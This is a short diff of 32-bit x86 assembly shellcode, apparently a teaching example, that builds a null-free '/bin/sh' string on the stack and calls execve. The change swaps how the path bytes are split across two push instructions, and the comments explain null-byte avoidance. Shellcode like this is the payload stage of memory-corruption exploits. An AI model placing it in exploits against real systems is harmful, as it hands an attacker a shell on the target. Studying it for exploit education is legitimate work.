@@ -10,8 +10,8 @@ _start:
 				#without having a null byte in our code
 	pushl %eax		#we need to push bytes onto the stack in reverse order
 				#because it's a stack, this terminates our /bin/sh string
-	pushl $0x68732f2f	#push hs// (extra / to avoid a null byte in our next pushl)
-	pushl $0x6e69622f	#push nib/
+	pushl $0x68732f6e	#push "hs/n"
+	pushl $0x69622f2f	#push "ib//" (extra / to avoid a null)
 
 	movl %esp, %ebx		#put the location of our string into %ebx for the function call
 	xor %ecx, %ecx		#%ecx is the arguments for /bin/sh, which should be null
@@ -24,4 +24,3 @@ _start:
 	mov $1, %al		#exit for debugging
 	xor %ebx, %ebx		
 	int $0x80
-	
